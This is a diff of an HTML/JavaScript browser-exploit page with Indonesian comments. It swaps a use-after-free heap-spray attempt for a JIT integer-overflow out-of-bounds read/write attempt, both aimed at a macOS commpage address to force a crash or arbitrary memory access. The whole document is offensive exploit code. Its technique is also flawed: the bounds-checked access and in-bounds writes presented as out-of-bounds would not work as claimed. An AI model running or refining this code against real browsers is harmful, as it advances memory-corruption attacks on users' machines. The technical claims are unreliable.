@@ -1,108 +1,131 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Aggressive Mono-Thread UAF Timing</title>
+    <title>JIT Integer Overflow OOB Attack</title>
 </head>
 <body>
 
-    <h1>UAF Timing Attack (Commpage Target)</h1>
+    <h1>Integer Overflow / OOB Attack (Commpage Target)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Siap Memulai Eksploitasi Timing...</p>
+    <p id="status">INIT: Siap Memulai Eksploitasi OOB...</p>
     <div id="log"></div>
 
     <script>
         // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
         const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
+        // Kita akan menggunakan alamat ini sebagai data yang dibaca atau ditulis
         const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
         
+        // Memisahkan nilai 64-bit untuk injeksi ke array 32-bit
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // Ini 0 untuk userspace
 
-        let victimObj = null; 
-        let payloadHolders = []; // Untuk menjaga agar payload tidak di-GC
+        let controlledArray = null; 
+        let payloadArray = null;
 
         function log(message) {
             document.getElementById('log').innerHTML += '<div>' + message + '</div>';
         }
 
-        // --- FUNGSI HEAP SPRAY PAYLOAD ---
-        function sprayPayload() {
-            const SPRAY_COUNT = 1000;
-            const PAYLOAD_SIZE = 64; // Ukuran disesuaikan dengan objek yang kita free
-
-            for (let i = 0; i < SPRAY_COUNT; i++) {
-                let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                
-                // Isi array dengan nilai Commpage Target Address
-                payloadArray[0] = HIGH_WORD; 
-                payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 1234.567; 
-                
-                payloadHolders.push(payloadArray); 
+        // 1. FUNGSI TARGET OPTIMASI JIT (Untuk memalsukan Type/Length)
+        function checkAndAccess(arr, index) {
+            // JIT akan mengasumsikan length (panjang) arr valid dan index berada dalam batas
+            if (index < arr.length) {
+                // Return nilai di index. Ini adalah titik dereferensi
+                return arr[index]; 
             }
-            log(`Phase Spray: ${SPRAY_COUNT} Payload dimasukkan.`);
+            return 0;
         }
 
-        // --- FUNGSI EKSEKUSI UTAMA ---
-        function runUAFSequence() {
-            log("Phase 1: Mengalokasikan Objek Korban.");
-            // 1. Alokasi Korban (ArrayBuffer adalah target umum)
-            victimObj = new ArrayBuffer(512); 
-            let victimView = new DataView(victimObj);
-            victimView.setUint32(0, 0xAAAAAAAA, true); // Pola unik korban
-            
-            // 2. Menciptakan Lubang Memori (FREE)
-            // Hapus referensi agar ArrayBuffer siap di-GC/free
-            victimObj = null; 
-            victimView = null;
-            log("Phase 2: Referensi korban dihapus (Siap di-FREE).");
-            
-            // 3. Memicu GC dan Mengisi Lubang (RACE CONDITION)
-            // Kita harus menciptakan alokasi memori yang sangat besar dan cepat (Inline Spray)
-            // untuk memaksa GC bekerja dan kemudian menimpa lubang tersebut.
-            
-            // Loop yang intensif untuk memakan waktu dan memaksa GC
-            for (let i = 0; i < 50000; i++) {
-                 // Alokasikan objek cepat di loop
-                 let tempArr = new Array(10).fill(i);
-            }
-            log("Phase 3: Loop intensif selesai. Memberikan waktu GC.");
+        // 2. FUNGSI INTI OVERFLOW
+        function triggerOOB() {
+            log("Phase 1: Mengalokasikan array target dan payload.");
 
-            // 4. Re-Allocate (Melakukan Spray Payload Tepat Setelah GC)
-            sprayPayload();
+            // A. Array Kontrol (Victim Array)
+            // Array ini akan kita buat Over-The-Boundary (melebihi batas)
+            controlledArray = new Uint32Array(5); // Hanya 5 elemen (20 bytes)
+            controlledArray.fill(0x11223344); 
+
+            // B. Array Payload (Attacker Array)
+            // Array ini akan kita letakkan SEBELUM atau SESUDAH controlledArray di memori
+            // Payload akan berisi alamat Commpage
+            payloadArray = new Uint32Array(5);
             
-            // 5. Memicu Trigger Eksploitasi
-            log("Phase 4: Mencoba Trigger UAF Dereference...");
+            // Masukkan TARGET_CONTROL_ADDRESS di akhir array payload
+            // Kita berharap ini akan berdekatan dengan memori controlledArray
+            payloadArray[3] = HIGH_WORD; 
+            payloadArray[4] = LOW_WORD; // Nilai 0xFFFFC320 di sini
+
+            // C. Forced Heap Allocation (Untuk menempatkan array berdampingan)
+            // Ciptakan banyak alokasi untuk memastikan controlledArray dan payloadArray berdekatan
+            for (let i = 0; i < 1000; i++) {
+                let filler = new Uint32Array(10); 
+            }
+            log("Phase 2: Heap Grooming (Penempatan array berdampingan).");
+
+
+            // D. Pelatihan JIT (Warming Up)
+            log("Phase 3: Melatih JIT (50,000 iterasi) pada akses aman...");
+            for (let i = 0; i < 50000; i++) {
+                checkAndAccess(controlledArray, 1); // Melatih JIT agar percaya panjang array adalah 5
+            }
+
+            // E. Pemicu Overflow dan OOB Access
             
-            // Kita perlu membuat objek baru yang menempati lokasi ArrayBuffer lama.
-            // Coba alokasikan lagi ArrayBuffer dengan ukuran yang sama, berharap mendapat lokasi yang ditimpa.
-            let attackerView = new DataView(new ArrayBuffer(512));
+            // Menciptakan variabel yang menyebabkan Integer Overflow.
+            // Di level C++, operasi ini (atau manipulasi length) dapat mengubah array.length
+            // Misalnya: (2^32 - 1) + 1 = 0. Jika length diubah ke 0, maka index -1 menjadi valid.
+
+            const HUGE_NUMBER = 0xFFFFFFFF; // Bilangan 32-bit terbesar
+            
+            // Coba panggil fungsi yang akan menggunakan index yang sangat besar (Integer Overflow)
+            // JIT yang sudah teroptimasi mungkin tidak memeriksa panjang array dengan benar
+            
+            // Index yang sangat besar (misalnya 0x100000000) di level JIT 32-bit dapat menjadi 0
+            const overflow_index = HUGE_NUMBER + 1; 
+
+            log("Phase 4: Memicu OOB dengan index besar (Integer Overflow)...");
             
             try {
-                // Akses data 64-bit pada lokasi yang seharusnya kini berisi TARGET_CONTROL_ADDRESS
-                const crashValue = attackerView.getBigInt64(0, true); 
+                // Kita akan mencoba membaca dari index di luar batas (OOB Read)
+                // Kita mencari index di mana kita bisa membaca data payloadArray di memori.
                 
-                log(`Nilai yang dibaca dari lokasi ditimpa: 0x${crashValue.toString(16)}`);
+                // Jika array berdampingan, index sekitar 5, 6, 7 akan membaca dari payloadArray.
+                const OOB_INDEX = 5; 
                 
-                // Memicu crash dengan menggunakan nilai yang dibaca sebagai pointer/objek
-                let crashTest = {};
-                // Memaksa JIT menggunakan nilai yang dibaca dari memori
-                crashTest[crashValue] = 1; 
+                // JIT menjalankan checkAndAccess yang sudah teroptimasi
+                let result = checkAndAccess(controlledArray, OOB_INDEX); 
+                
+                log(`OOB Read berhasil! Nilai yang dibaca: 0x${result.toString(16)}`);
+                
+                if (result === LOW_WORD) {
+                    log("SUCCESS! Nilai Commpage Address berhasil dibaca dari OOB.");
+                    // Lakukan trigger final untuk crash
+                    
+                    // Kita menimpa sebuah nilai dengan alamat Commpage (OOB Write)
+                    controlledArray[OOB_INDEX + 1] = 0xDEADBEEF; // Nilai sampah
+                    controlledArray[OOB_INDEX] = LOW_WORD;       // Target Alamat (0xFFFFC320)
+                    
+                    // Mencoba crash dengan menggunakan nilai yang baru ditimpa
+                    // Ini akan memuat TARGET_CONTROL_ADDRESS ke register.
+                    let crashObj = {};
+                    crashObj[LOW_WORD] = 1;
 
-            } catch(e) {
-                // Tetap log error JS, tetapi tunggu Segfault OS
+                } else {
+                    log("OOB Read gagal mendapatkan nilai Commpage. Membutuhkan tuning index.");
+                }
+            
+            } catch (e) {
                 log("JS Error: " + e.message + " - Menunggu Segfault OS.");
             }
+            
         }
-        
+
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian UAF Timing...';
-            
-            // Jadwalkan eksekusi utama agar sistem bisa inisialisasi
-            setTimeout(runUAFSequence, 50);
-            
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah EXC_BAD_ACCESS.';
+            document.getElementById('status').textContent = 'Memulai rangkaian Integer Overflow...';
+            setTimeout(triggerOOB, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Arbitrary Read/Write.';
         });
 
     </script>
